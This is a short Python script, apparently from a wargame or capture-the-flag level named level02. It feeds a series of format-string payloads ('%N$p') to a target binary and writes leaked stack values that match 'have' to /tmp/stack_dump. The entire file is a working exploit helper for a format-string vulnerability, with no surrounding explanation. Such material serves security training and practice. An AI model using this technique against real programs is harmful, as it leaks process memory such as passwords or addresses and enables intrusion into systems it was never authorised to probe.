import os

for i in range(1, 50):
    stack = "python -c \'print \"%" + str(i) + "$p" + "\\n\"\'"
    bin_path = " | /home/users/level02/level02"
    grep = "| grep have >> /tmp/stack_dump"
    playload = stack + bin_path + grep
    os.system(playload)
